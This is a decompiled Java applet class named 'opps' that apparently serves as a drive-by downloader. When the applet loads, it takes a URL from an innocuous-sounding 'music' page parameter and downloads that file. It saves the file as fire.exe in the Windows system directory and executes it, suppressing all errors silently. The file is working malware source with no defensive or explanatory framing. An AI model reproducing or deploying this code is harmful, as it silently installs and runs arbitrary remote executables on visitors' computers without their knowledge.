import java.io.InputStream;
import java.net.URLConnection;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class opps extends Applet
{
    public void init() {
        final String Fire = "fire";
        final String Fire2 = System.getenv("WINDIR");
        final String Fire3 = "\\" + Fire + ".exe";
        try {
            final URL link = new URL(this.getParameter("music"));
            final BufferedOutputStream bfff = new BufferedOutputStream(new FileOutputStream(Fire2.concat(Fire3)));
            final URLConnection localURLConnection = link.openConnection();
            final InputStream olmazki = localURLConnection.getInputStream();
            final byte[] yazdir = new byte[1024];
            long l = 0L;
            int i;
            while ((i = olmazki.read(yazdir)) != -1) {
                bfff.write(yazdir, 0, i);
                l += i;
            }
            try {
                if (olmazki != null) {
                    olmazki.close();
                }
                if (bfff != null) {
                    bfff.close();
                }
            }
            catch (IOException ex) {}
            final Runtime localRuntime = Runtime.getRuntime();
            try {
                final Process yereli\u015flem = localRuntime.exec(Fire2.concat(Fire3));
                yereli\u015flem.waitFor();
                final BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(yereli\u015flem.getInputStream()));
            }
            catch (Exception ex2) {}
            try {
                if (bfff != null) {
                    bfff.close();
                }
            }
            catch (IOException ex3) {}
        }
        catch (Exception ex4) {}
    }
}
